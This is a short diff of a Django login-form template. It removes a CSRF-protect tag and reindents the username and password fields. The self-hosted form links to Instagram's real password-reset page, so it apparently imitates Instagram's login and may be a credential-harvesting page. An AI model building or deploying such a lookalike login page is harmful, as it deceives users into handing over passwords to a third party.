@@ -24,19 +24,18 @@
                   <div class="form-wrap">
                     <form class="form" method="post" action="">
                       {% csrf_token %}
-                      {% csrf_protect %}
-                      <div class="input-box">
-                        {{ form.logins }}
-                      </div>
+                        <div class="input-box">
+                          {{ form.logins }}
+                        </div>
 
-                      <div class="input-box">
-                        {{ form.password }}
-                      </div>
-                      <span class="button-box">
-                        <button class="btn" type="submit" name="submit">Log in</button>
-                      </span>
-                      <span>{{ error }}</span>
-                      <a class="forgot" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+                        <div class="input-box">
+                          {{ form.password }}
+                        </div>
+                        <span class="button-box">
+                          <button class="btn" type="submit" name="submit">Log in</button>
+                        </span>
+                        <span>{{ error }}</span>
+                        <a class="forgot" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                     </form>
                   </div> <!-- Form-wrap end -->
                 </div> <!-- Login-box end -->
